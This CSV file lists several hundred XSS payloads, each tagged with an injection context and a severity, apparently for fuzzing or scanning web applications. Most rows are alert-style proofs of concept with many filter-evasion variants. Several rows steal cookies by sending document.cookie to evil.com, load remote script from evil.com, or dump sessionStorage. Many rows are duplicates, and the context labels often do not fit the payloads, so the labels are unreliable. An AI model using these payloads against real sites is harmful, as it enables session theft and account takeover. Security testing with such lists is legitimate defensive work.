payload,context,severity
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",tag_injection,high
<svg onload=alert()>,tag_injection,medium
onErRor=aleRt(0);>,tag_injection,medium
onerror='alert(1)',tag_injection,medium
<BODY ONLOAD=alert(‘XSS’)>,tag_injection,medium
"?alert(1)"",",tag_injection,medium
onload=”alert(‘AnonKryptiQuz’),tag_injection,medium
"<svg onload=""confirm(7)"">",tag_injection,medium
<body onload=alert(1)>,event_handler,medium
<img src=x onerror=alert(1)>,attribute_escape,medium
"{{constructor.constructor(""alert(1)"")()}}",dom_sink,low
<img/src=x onerror=alert(1)//>,js_uri,medium
<svg/onload=alert(1)>,tag_injection,high
#{alert(1)},template_injection,high
<svg/onload=alert(1)>,dom_sink,high
j\u0061v\u0061script:confirm(1),js_uri,high
<script>alert(1)</script>,generic,medium
<svg/onload=alert(1)>,tag_injection,low
"<svg onload=""confirm(7)"">",tag_injection,medium
"javascript:void(document.location=""http://evil.com"")",js_uri,low
<body onload=alert(1)>,event_handler,medium
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",tag_injection,high
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",tag_injection,high
<SCRIPT>alert(1)</SCRIPT>,tag_injection,medium
<marquee>d.innerHTML+='';</script>,tag_injection,high
"<script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",attribute_escape,high
""" onerror=alert(1) x=""",attribute_escape,high
%3CSCRIPT%3Ealert(1)%3C/SCRIPT%3E,script_injection,high
%3Cimg/src=%3Dx+onload=alert(2)%3D,tag_injection,medium
<svg onload=alert(1)>,event_handler,low
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",tag_injection,high
onload='alert(1)',tag_injection,medium
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
%3Cscript%3Ealert(document.domain)%3C/script%3E,attribute_escape,high
"eval(""alert(1)"")",dom_sink,high
"prompt`1`)//"";confirm(String.fromCharCode(88,83,83))//--",tag_injection,high
<img/src/onerror=alert(1),tag_injection,medium
"//"";alert(String.fromCharCode(88,83,83))",tag_injection,high
innerHTML=location.hash>#<script>alert(1)</script>,tag_injection,high
"oncontextmenu=""alert(1)""",tag_injection,medium
ONLOad='ALeRt(1)',tag_injection,medium
javascript:alert(1),script_injection,high
"<iframe src=""javascript:alert(1)"">",tag_injection,medium
"<ScrIpt>alErt(strINg.fROMChARCODE(88,83,83))</sCRIPT>",tag_injection,high
${alert(	1)},template_injection,high
\' onerror=alert(1)//,attribute_escape,low
' onmouseover=alert(1) ',attribute_escape,low
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,tag_injection,high
javascript:alert(document.domain),js_uri,low
;alert(1);,tag_injection,medium
' onerror=confirm(1) x=',attribute_escape,medium
"setTimeout(""alert(1)"",0)",dom_sink,high
onerror=alert(0);>,tag_injection,medium
"\"" onerror=alert(1)//",attribute_escape,high
"""><svg onload=alert()>",tag_injection,medium
' onerror=alert(1) x=',attribute_escape,low
""" onclick=alert()1 a=""",attribute_escape,medium
"<ScRIpT>D.iNNErhTML+='';</sCrIpT>//[""'`-->]]>]</div>",tag_injection,high
<SCRIPT src=//evil.com/xss.js></SCRIPT>,dom_sink,low
"onload=""prompt`1`""",tag_injection,medium
<marquee onstart=alert(1)>,script_injection,high
"javascript:void(document.location=""http://evil.com"")",js_uri,high
"""><details>alert(String.fromCharCode(88,83,83))</script>",attribute_escape,high
javascript:confirm(0);,js_uri,medium
"document.body.innerHTML=""<img src=x onerror=alert(1)>""",event_handler,medium
<%= alert(1) %>,template_injection,medium
"setTimeout(""al'+'ert(1)"",0)",tag_injection,medium
\' onload=alert(1)//,event_handler,low
${alert(1)},template_injection,low
"""><svg onload=alert()>",tag_injection,medium
<svg src=x onerror=alert(1)>,dom_sink,high
"<script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
setInterval('ale'+'rt(10)');,tag_injection,high
"<object data
=""javascript:alert(	1)"">",tag_injection,high
alert(1),tag_injection,medium
"<embed src=""javascript:alert(1)"">",tag_injection,medium
</tag><svg onload=alert(1)>,tag_injection,medium
alert(2),tag_injection,medium
\' onerror=alert(1)//,event_handler,low
#{alert(1)},js_uri,medium
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",tag_injection,high
<script ^__^>alert(String.fromCharCode(49))</script ^__^,tag_injection,high
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,tag_injection,high
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",tag_injection,high
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,tag_injection,high
javascript:confirm(1),js_uri,medium
-alert(1)-',tag_injection,medium
confirm(),tag_injection,medium
&quot; onerror=alert(1) x=&quot;,attribute_escape,high
"onblur=""alert(1)""",tag_injection,medium
"mrco24""type=image src onerror=""alert(1)""",tag_injection,medium
<video src=x onerror=alert(1)>,event_handler,medium
javascript:alert(document.domain),js_uri,medium
<script>alert(document.domain)</script>,script_injection,low
<scr/**/ipt>prompt(1)</scr/**/ipt>,script_injection,low
confirm(),tag_injection,medium
&quot; onerror=alert(1) x=&quot;,attribute_escape,high
"javascript:void(document.location=""http://evil.com"")",js_uri,medium
javascript:alert(document.domain),script_injection,high
' onmouseover=alert(1) ',attribute_escape,low
"<script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",attribute_escape,high
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
<image src/onerror=alert(1)>,tag_injection,medium
onload='alert(1)',tag_injection,medium
onerror=alert;throw 23;,tag_injection,low
"//"";alERt(STRiNG.fROmcHArcodE(88,83,83))",tag_injection,high
""" onfocus=alert(1) autofocus=""",attribute_escape,low
<body onload=alert(1)>,event_handler,medium
\x3cbody onload=alert(1)\x3e,attribute_escape,low
"document.body.innerHTML=""<svg src=x onerror=alert(1)>""",dom_sink,medium
<image src/onerror=alert(1)>,tag_injection,medium
#jAVAScRIPT:ALERT(2);,js_uri,medium
<video src=x onerror=confirm(1)>,event_handler,low
"setTimeout(""alert(1)"",0)",attribute_escape,high
alert(1);,tag_injection,medium
<img src/onerror=prompt(8)>,tag_injection,medium
#{confirm(1)},template_injection,high
"location=""javascript:alert(1)""",dom_sink,medium
"document.write(""<img src=x onload=alert(1)>"")",event_handler,high
<svgonload=alert(1)>,tag_injection,medium
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,low
""">< script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
"""><svg onload=alert()>",tag_injection,medium
alert(1);,tag_injection,medium
"javascript:void(document.location=""http://evil.com"")",template_injection,low
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",tag_injection,high
<BoDy oNlOaD=AlErT(1)>,event_handler,high
\' onerror=alert(1)//,attribute_escape,high
<input onfocus=alert(1) autofocus>,js_uri,low
javascript:confirm(1),js_uri,low
""" onerror=alert(1) x=""",attribute_escape,low
\x3cscript\x3eprompt(1)\x3c/script\x3e,script_injection,high
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",tag_injection,high
"eval(""alert(1)"")",js_uri,low
";alert(String.fromCharCode(88,83,83))// ></SCRIPT> > ><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,tag_injection,high
<script>alert(1)</script>,script_injection,medium
<audio src/onerror=alert(1)>,tag_injection,medium
""" onerror=confirm(1) x=""",script_injection,medium
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,tag_injection,high
\' onerror=al'+'ert(1)//,attribute_escape,high
<img src/onerror=prompt(8)>,tag_injection,medium
#{confirm(1)},js_uri,high
<input onfocus=al'+'ert(1) autofocus>,event_handler,medium
_0x68087f:alert(0x1);,tag_injection,medium
' onerror=alert(1) x=',attribute_escape,medium
"<iframe src
=""javascript:alert(	1)"">",tag_injection,medium
{{7*7}},template_injection,high
"&quot; onerror
=alert(	1) x
=&quot;",event_handler,high
<body onload=alert(1)>,event_handler,medium
"<embed src=""javascript:alert(1)"">",tag_injection,low
"\""\x3e\x3cimg src=x onerror=alert(1)\x3e",attribute_escape,low
";alert(String.fromCharCode(88,83,83))// ></SCRIPT> > ><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
\x3cscript\x3econfirm(1)\x3c/script\x3e,script_injection,high
<input onfocus=\u0061\u006cert(1) \u0061utofocus>,event_handler,medium
{{7*7}},template_injection,high
"\""><img src=x onerror=alert(1)>",attribute_escape,medium
<img src=x onerror=alert(1)>,tag_injection,medium
<img src=x onerror=alert(1)>,js_uri,high
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",tag_injection,high
<script>confirm(1)</script>,script_injection,medium
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",tag_injection,high
"""><svg onload=alert(1)>",attribute_escape,medium
onload=”alert(‘AnonKryptiQuz’),attribute_escape,medium
<video src=x onerror=alert(1)>,js_uri,medium
"<svg onload=""confirm(7)"">",tag_injection,medium
/?xss=500); alert(document.cookie);//,script_injection,high
嘼img src=1 onerror=alert(1)嘾,tag_injection,medium
<img src/onerror=alert(1)>,tag_injection,medium
<img src/onerror=prompt(8)>,tag_injection,medium
"eval(""alert(1)"")",dom_sink,high
jAvAsCrIpT:CoNfIrM(1),dom_sink,low
"""><img src=x onerror=alert(1)>",attribute_escape,medium
"""><button onload=alert()>",tag_injection,medium
"{{([].toString()).constructor.prototype.charAt=[].join;$eval(([].toString()).constructor.fromCodePoint([120],[61],[49],[125],[125],[125],[59],[97],[108],[101],[114],[116],[40],[49],[41],[47],[47]));}}",js_uri,low
"\""<>onauxclick<>=(eval)(atob(`YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==`))>+<sss",attribute_escape,high
"""><svg onload=alert()>",tag_injection,medium
"{{constructor.constructor(""\u0061\u006cert(1)"")()}}",template_injection,medium
<svg id=1 onload=confirm(1)>,tag_injection,medium
<SCRIPT>alert(1)</SCRIPT>,script_injection,medium
' onmouseover=alert(1) ',attribute_escape,medium
<script>prompt(1)</script>,attribute_escape,medium
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",tag_injection,high
<BODY ONLOAD=alert(8839)>,tag_injection,medium
"#""><svg onload=alert(1)>",attribute_escape,medium
\u003e\u003cimg src=1 onerror=alert(0)\u003e,attribute_escape,medium
-alert(23)/,tag_injection,medium
"%20""><svg onload=alert(1)>",tag_injection,medium
""" onload=alert(1) x=""",attribute_escape,high
<img src=x onerror=alert(1)>,dom_sink,low
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",tag_injection,high
alert(2),tag_injection,medium
"//"";alert(String.fromCharCode(88,83,83))",tag_injection,high
<video src=x onerror=alert(1)>,event_handler,medium
""" onload=alert(1) x=""",dom_sink,medium
"\"" onerror=alert(1)//",attribute_escape,high
</script><svg onload=alert(1)>,tag_injection,medium
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",tag_injection,high
"onerror=""alert(document.cookie)""",tag_injection,medium
onerror=alert(0);>,tag_injection,medium
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",tag_injection,high
alert(String.fromCharCode(88))</SCRIPT>,tag_injection,high
<img src/onerror=alert(1)>,tag_injection,medium
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,low
<marquee onstart=alert(1)>,event_handler,medium
oNlOaD='ALERt(1)',tag_injection,medium
<input onfocus=alert(1) autofocus>,event_handler,high
j\u0061v\u0061script:\u0061\u006cert(document.dom\u0061in),js_uri,high
"<embed src
=""javascript:alert(	1)"">",tag_injection,low
<details open ontoggle=alert(1)>,event_handler,low
%3Cimg/src=%3Dx+onload=alert(2)%3D,tag_injection,medium
"{{constructor.constructor(""confirm(1)"")()}}",attribute_escape,low
onerror='alert(1)',tag_injection,medium
${alert(1)},attribute_escape,low
"""><img src
=x onerror
=alert(	1)>",attribute_escape,low
""" onerror=alert()1 a=""",attribute_escape,medium
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",tag_injection,high
"%20""><svg onload=alert(1)>",tag_injection,medium
""">< svg onload=alert(1)>",attribute_escape,medium
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",tag_injection,high
< svg onload=alert()>,tag_injection,medium
<script>prompt(1)</script>,tag_injection,medium
"""><svg onload=prompt`1`>",tag_injection,medium
"\"" onerror=alert(1)//",attribute_escape,medium
"""\x3e\x3cimg src=x onerror=alert(1)\x3e",attribute_escape,high
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,medium
confirm(),tag_injection,medium
‘ onmouseover=’alert(1)’,tag_injection,medium
<svg/on\u006co\u0061d=\u0061\u006cert(1)>,tag_injection,high
""" onerror=alert(1) x=""",attribute_escape,high
<details open ontoggle=alert(1)>,event_handler,high
{{7*7}},template_injection,medium
<BODY ONLOAD=alert(‘XSS’)>,tag_injection,medium
"//"";alert(String.fromCharCode(88,83,83))",attribute_escape,high
innerHTML=location.hash>#<script>alert(1)</script>,tag_injection,high
"<object data=""javascript:alert(1)"">",tag_injection,medium
onerror=alert(0);>,tag_injection,medium
"<object data=""javascript:alert(1)"">",tag_injection,low
嘼img src=1 onerror=self.alert(1)嘾,attribute_escape,medium
"onsearch=""alert(1)""",tag_injection,medium
onload='alert(1)',tag_injection,medium
{{7*7}},js_uri,high
;alert(1);,tag_injection,medium
alert(String.fromCharCode(88))</SCRIPT>,tag_injection,high
"//"";alert(String.fromCharCode(88,83,83))",tag_injection,high
"{{constructor.constructor(""confirm(1)"")()}}",script_injection,medium
"vbscript:prompt(1)#{""action"":1}",script_injection,medium
""" onerror=confirm(1) x=""",attribute_escape,low
""" onload=alert(1) x=""",attribute_escape,low
<svgonload=alert(1)>,attribute_escape,medium
<svg onload=alert()>,tag_injection,medium
"\x3cembed src=""javascript:alert(1)""\x3e",tag_injection,medium
"document.write(""&lt;img src=x onerror=alert(1)&gt;"")",attribute_escape,low
<BODY ONLOAD=alert(8839)>,tag_injection,medium
javascript:alert(document.domain),attribute_escape,high
javascript:confirm(1)//,js_uri,medium
<body onload=alert(1)>,event_handler,low
JavaSCript:alert(123),js_uri,medium
\x3cdetails open ontoggle=alert(1)\x3e,js_uri,high
<BODY ONLOAD=alert(8839)>,tag_injection,medium
"\x3cscript\x3edocument.location=""http://evil.com/?c=""+document.cookie\x3c/script\x3e",js_uri,medium
""">< svg onload=alert()>",tag_injection,medium
\x3cimg/src=x onerror=alert(1)//\x3e,attribute_escape,low
<script>prompt(1)</script>,dom_sink,low
<svg////////onload=alert(1)>,tag_injection,medium
"<vIdeO	><sourCe onerror=""['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])"">",tag_injection,high
"<svg onload=""confirm(7)"">",tag_injection,medium
"mrco24""type=image src onerror=""alert(1)""",tag_injection,medium
onerror='alert(1)',tag_injection,medium
<script src=//evil.com/xss.js></script>,script_injection,medium
onerror='alert(1)',tag_injection,medium
<marquee onstart=alert(1)>,event_handler,low
"{{constructor.constructor(""alert(1)"")()}}",template_injection,high
<SCRIPT>confirm(1)</SCRIPT>,template_injection,high
{{7*7}},script_injection,medium
%3Cx onxxx=alert(1),tag_injection,medium
javascript:alert(document.domain),script_injection,medium
"""><svg onload=alert()>",tag_injection,medium
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
""" onerror
=alert(	1) x
=""",attribute_escape,medium
"document.body.innerHTML=""<img src=x onerror=alert(1)>""",event_handler,medium
<details open ontoggle=alert(1)>,event_handler,high
<script>alert(1)</script>,script_injection,high
{{_Vue.h.constructor`confirm`1``()}},js_uri,medium
"document.body.innerHTML=""&lt;img src=x onerror=alert(1)&gt;""",dom_sink,medium
<marquee onstart=alert(1)>,event_handler,high
"\"" onerror=alert(1)//",attribute_escape,medium
\x3cimg src=x onerror=alert(1)\x3e,event_handler,low
onsubmit=”alert(‘AnonKryptiQuz’),tag_injection,medium
<%= alert(1) %>,template_injection,low
"<SCRIPT>document.location=""http://evil.com/?c=""+document.cookie</SCRIPT>",script_injection,medium
""" onerror=alert(1) x=""",attribute_escape,low
"<script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
onauxclick=”alert(‘AnonKryptiQuz’),attribute_escape,medium
<script ^__^>alert(String.fromCharCode(49))</script ^__^,tag_injection,high
"\"" onerror=confirm(1)//",attribute_escape,medium
' onerror=alert(1) x=',attribute_escape,low
"{{constructor.constructor(""alert(1)"")()}}",event_handler,low
"""><img src=x onerror=alert(1)>",attribute_escape,medium
#{alert(1)},template_injection,low
"<iframe src=""javascript:alert(1)"">",script_injection,high
"<object data=""javascript:alert(1)"">",tag_injection,medium
top.alert(1),attribute_escape,medium
<script src=//evil.com/xss.js></script>,script_injection,medium
